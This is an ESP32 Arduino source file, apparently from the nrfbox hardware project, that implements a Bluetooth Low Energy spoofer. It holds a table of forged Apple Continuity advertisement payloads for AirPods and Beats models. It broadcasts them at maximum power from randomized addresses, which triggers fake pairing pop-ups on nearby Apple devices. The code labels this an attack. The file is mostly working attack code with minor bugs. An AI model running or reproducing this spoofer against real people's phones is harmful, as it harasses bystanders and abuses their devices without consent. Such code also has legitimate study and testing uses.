/* ____________________________
   This software is licensed under the MIT License:
   https://github.com/cifertech/nrfbox
   ________________________________________ */
   
#include <Arduino.h> 
#include "spoofer.h"

extern U8G2_SSD1306_128X64_NONAME_F_HW_I2C u8g2;
extern Adafruit_NeoPixel pixels;

BLEAdvertising *pAdvertising;  
std::string devices_uuid = "00003082-0000-1000-9000-00805f9b34fb";

const int deviceTypeNextPin = 27; 
const int deviceTypePrevPin = 25; 
const int advTypeNextPin = 33;    
//const int advTypePrevPin = 27;    
const int advControlPin = 26;     

uint32_t delayMillisecond = 1000;
unsigned long lastDebounceTimeNext = 0;
unsigned long lastDebounceTimePrev = 0;
unsigned long lastDebounceTimeAdvNext = 0;
unsigned long lastDebounceTimeAdvPrev = 0;

int lastButtonStateNext = LOW;
int lastButtonStatePrev = LOW;
int lastButtonStateAdvNext = LOW;
int lastButtonStateAdvPrev = LOW;


unsigned long lastDebounceTime = 0;
unsigned long debounceDelay = 500; 

bool isAdvertising = true; 

int scanTime = 5;
int deviceType = 1;
int delaySeconds = 1;
int advType = 1;
int attack_state = 1;
int device_choice = 0;
int device_index = 0;

// Payload data
const uint8_t DEVICES[][31] = {
  // Airpods
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  // Airpods Pro
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0e, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  // Airpods Max
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0a, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  // Airpods Gen 2
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0f, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  // Airpods Gen 3
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x13, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  // Airpods Pro Gen 2
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x14, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  // Power Beats
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x03, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  // Power Beats Pro
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0b, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  // Beats Solo Pro
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0c, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  // Beats Studio Buds
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x11, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  // Beats Flex
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x10, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  // Beats X
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x05, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  // Beats Solo 3
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x06, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  // Beats Studio 3
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x09, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  // Beats Studio Pro
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x17, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  // Betas Fit Pro
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x12, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  // Beats Studio Buds Plus
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x16, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
};

BLEAdvertisementData getAdvertismentData() {
  BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();

  if (device_choice == 0) {
    oAdvertisementData.addData(std::string((char*)DEVICES[device_index], 31));
  }


  int adv_type_choice = random(3);
  if (adv_type_choice == 0) {
    pAdvertising->setAdvertisementType(ADV_TYPE_IND);
  } else if (adv_type_choice == 1) {
    pAdvertising->setAdvertisementType(ADV_TYPE_SCAN_IND);
  } else {
    pAdvertising->setAdvertisementType(ADV_TYPE_NONCONN_IND);
  }

  return oAdvertisementData;
}

void updateDisplay() {
  u8g2.clearBuffer(); 

    // Display device type
  u8g2.setFont(u8g2_font_profont11_tf);
  u8g2.drawStr(0, 10, "Device:");
  int x = 0;
  int y = 25;
  

  switch (deviceType) {
    case 1:
      u8g2.drawStr(x, y, "[ Airpods ]");
      break;
    case 2:
      u8g2.drawStr(x, y, "[ Airpods Pro ]");
      break;
    case 3:
      u8g2.drawStr(x, y, "[ Airpods Max ]");
      break;
    case 4:
      u8g2.drawStr(x, y, "[ Airpods Gen 2 ]");
      break;
    case 5:
      u8g2.drawStr(x, y, "[ Airpods Gen 3 ]");
      break;
    case 6:
      u8g2.drawStr(x, y, "[ Airpods Gen 2 ]");
      break;
    case 7:
      u8g2.drawStr(x, y, "[ PowerBeats ]");
      break;
    case 8:
      u8g2.drawStr(x, y, "[ PowerBeats Pro ]");
      break;
    case 9:
      u8g2.drawStr(x, y, "[ Beats Solo Pro ]");
      break;
    case 10:
      u8g2.drawStr(x, y, "[ Beats Buds ]");
      break;
    case 11:
      u8g2.drawStr(x, y, "[ Beats Flex ]");
      break;
    case 12:
      u8g2.drawStr(x, y, "[ BeatsX ]");
      break;
    case 13:
      u8g2.drawStr(x, y, "[ Beats Solo3 ]");
      break;
    case 14:
      u8g2.drawStr(x, y, "[ Beats Studio3 ]");
      break;
    case 15:
      u8g2.drawStr(x, y, "[ Beats StudioPro ]");
      break;
    case 16:
      u8g2.drawStr(x, y, "[ Beats FitPro ]");
      break;
    case 17:
      u8g2.drawStr(x, y, "[ Beats BudsPlus ]");
      break;
    default:
      u8g2.drawStr(x, y, "[ Airpods ]");
      break;
  }

  u8g2.drawStr(0, 45, "Adv Type:");

  switch (advType) {
    case 1:
        u8g2.drawStr(60, 45, "IND");
        break;
    case 2:
        u8g2.drawStr(60, 45, "DIRECT HIGH");
        break;
    case 3:
        u8g2.drawStr(60, 45, "SCAN");
        break;
    case 4:
        u8g2.drawStr(60, 45, "NONCONN");
        break;
    case 5:
        u8g2.drawStr(60, 45, "DIRECT LOW");
        break;
  }

  u8g2.drawStr(0, 60, "Advertising:");
  u8g2.setCursor(80, 60);
  u8g2.print(isAdvertising ? "Disable" : "Active");

  u8g2.sendBuffer(); 
}

void Airpods() {
  device_choice = 0;
  device_index = 0;
  attack_state = 1;
}

void Airpods_pro() {
  device_choice = 0;
  device_index = 1;
  attack_state = 1;
}

void Airpods_Max() {
  device_choice = 0;
  device_index = 2;
  attack_state = 1;
}

void Airpods_Gen_2() {
  device_choice = 0;
  device_index = 3;
  attack_state = 1;
}

void Airpods_Gen_3() {
  device_choice = 0;
  device_index = 4;
  attack_state = 1;
}

void Airpods_Pro_Gen_2() {
  device_choice = 0;
  device_index = 5;
  attack_state = 1;
}

void Power_Beats() {
  device_choice = 0;
  device_index = 6;
  attack_state = 1;
}

void Power_Beats_Pro() {
  device_choice = 0;
  device_index = 7;
  attack_state = 1;
}

void Beats_Solo_Pro() {
  device_choice = 0;
  device_index = 8;
  attack_state = 1;
}

void Beats_Studio_Buds() {
  device_choice = 0;
  device_index = 9;
  attack_state = 1;
}

void Beats_Flex() {
  device_choice = 0;
  device_index = 10;
  attack_state = 1;
}

void Beats_X() {
  device_choice = 0;
  device_index = 11;
  attack_state = 1;

}

void Beats_Solo_3() {
  device_choice = 0;
  device_index = 12;
  attack_state = 1;

}

void Beats_Studio_3() {
  device_choice = 0;
  device_index = 13;
  attack_state = 1;

}

void Beats_Studio_Pro() {
  device_choice = 0;
  device_index = 14;
  attack_state = 1;

}

void Betas_Fit_Pro() {
  device_choice = 0;
  device_index = 15;

}

void Beats_Studio_Buds_Plus() {
  device_choice = 0;
  device_index = 16;
  attack_state = 1;

}
void setAdvertisingData() {

  switch (deviceType) {
    case 1:
      Airpods();
      break;
    case 2:
      Airpods_pro();
      break;
    case 3:
      Airpods_Max();
      break;
    case 4:
      Airpods_Gen_2();
      break;
    case 5:
      Airpods_Gen_3();
      break;
    case 6:
      Airpods_Pro_Gen_2();
      break;
    case 7:
      Power_Beats();
      break;
    case 8:
      Power_Beats_Pro();
      break;
    case 9:
      Beats_Solo_Pro();
      break;
    case 10:
      Beats_Studio_Buds();
      break;
    case 11:
      Beats_Flex();
      break;
    case 12:
      Beats_X();
      break;
    case 13:
      Beats_Solo_3();
      break;
    case 14:
      Beats_Studio_3();
      break;
    case 15:
      Beats_Studio_Pro();
      break;
    case 16:
      Betas_Fit_Pro();
      break;
    case 17:
      Beats_Studio_Buds_Plus();
      break;
    default:
      Airpods();
      break;

      updateDisplay();
  }
}


void handleButtonPress(int pin, void (*callback)()) {
  int reading = digitalRead(pin);

  if (reading == LOW) {
    unsigned long currentTime = millis();
    delay(300);
    updateDisplay();

    if ((currentTime - lastDebounceTime) > debounceDelay) {
      callback();
      lastDebounceTime = currentTime;
    }
  }
}

void changeDeviceTypeNext() {
  deviceType++;
  if (deviceType > 26) deviceType = 1;
  Serial.println("Device Type Next: " + String(deviceType));
  setAdvertisingData();
  updateDisplay();
}

void changeDeviceTypePrev() {
  deviceType--;
  if (deviceType < 1) deviceType = 26;
  Serial.println("Device Type Prev: " + String(deviceType));
  setAdvertisingData();
  updateDisplay();
}

void changeAdvTypeNext() {
  advType++;
  if (advType > 5) advType = 1;
  Serial.println("Advertising Type Next: " + String(advType));
  setAdvertisingData();
  updateDisplay();
}

void changeAdvTypePrev() {
  advType--;
  if (advType < 1) advType = 5;
  Serial.println("Advertising Type Prev: " + String(advType));
  setAdvertisingData();
  updateDisplay();
}

void toggleAdvertising() {
  
  setNeoPixelColour("0");

  isAdvertising = !isAdvertising;
  
  if (!isAdvertising) {
    pAdvertising->stop();
    setNeoPixelColour("red");
    Serial.println("Advertising stopped.");
    updateDisplay();
  }
  if (isAdvertising) {
      setNeoPixelColour("0");
    if (attack_state == 1) {
      esp_bd_addr_t dummy_addr = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
      for (int i = 0; i < 6; i++) {
        dummy_addr[i] = random(256);
        if (i == 0) {
          dummy_addr[i] |= 0xF0;
        }
      }
      // selectDevice(selectedPacket);

      BLEAdvertisementData oAdvertisementData = getAdvertismentData();

      pAdvertising->setDeviceAddress(dummy_addr, BLE_ADDR_TYPE_RANDOM);
      pAdvertising->addServiceUUID(devices_uuid);
      pAdvertising->setAdvertisementData(oAdvertisementData);

      pAdvertising->setMinInterval(0x20);
      pAdvertising->setMaxInterval(0x20);
      pAdvertising->setMinPreferred(0x20);
      pAdvertising->setMaxPreferred(0x20);

      pAdvertising->start();
      delay(delayMillisecond); // delay for delayMillisecond ms
      pAdvertising->stop();
    }

    Serial.println("Advertising started.");
    updateDisplay();
    
    if (digitalRead(advControlPin) == LOW) {
      delay(50);  // Debounce delay
      isAdvertising = !isAdvertising;
      updateDisplay(); 
      //break;  
    }
  }
   //isAdvertising = !isAdvertising;
}


void spooferSetup() {

  pinMode(deviceTypeNextPin, INPUT_PULLUP);
  pinMode(deviceTypePrevPin, INPUT_PULLUP);
  pinMode(advTypeNextPin, INPUT_PULLUP);
  //pinMode(advTypePrevPin, INPUT_PULLUP);
  pinMode(advControlPin, INPUT_PULLUP);

  BLEDevice::init("AirPods 69");
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);
  updateDisplay();
  BLEServer *pServer = BLEDevice::createServer();
  pAdvertising = pServer->getAdvertising();

  esp_bd_addr_t null_addr = {0xFE, 0xED, 0xC0, 0xFF, 0xEE, 0x69};
  pAdvertising->setDeviceAddress(null_addr, BLE_ADDR_TYPE_RANDOM);
  delay(500);

}

void spooferLoop() {
  
  handleButtonPress(deviceTypeNextPin, changeDeviceTypeNext);
  handleButtonPress(deviceTypePrevPin, changeDeviceTypePrev);
  handleButtonPress(advTypeNextPin, changeAdvTypeNext);
  //handleButtonPress(advTypePrevPin, changeAdvTypePrev);
  handleButtonPress(advControlPin, toggleAdvertising); 

  delay(50); // Avoid overloading the CPU
}
